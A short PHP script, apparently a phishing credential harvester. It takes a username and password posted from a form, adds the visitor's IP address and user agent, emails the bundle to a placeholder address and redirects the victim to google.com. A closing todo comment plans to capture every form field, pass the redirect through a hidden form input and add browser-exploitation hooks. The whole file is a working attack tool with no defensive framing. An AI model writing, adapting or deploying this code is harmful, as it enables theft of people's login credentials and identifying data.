<?php // 🎣.php
$e = 'e-m@i.l'; // email
$r = 'https://google.com'; // redirect
$u = $_POST['u']; // username
$p = $_POST['p']; // password
$a = $_SERVER['HTTP_USER_AGENT']; // user agent
$i = getenv('REMOTE_ADDR'); // ip address
$x = implode(':',array($p,$i,$a)); // format
mail($e,$u,$x); // send the email
header('Location: '.$r); // redirect
/* todo: 
just send all $_POST params
& $redirect from hidden form
post request so multiple
<>< @ 🎣.php -> teh tank
+ mail subject to $r site
++ BeEF h00kz and alike?
*/?>
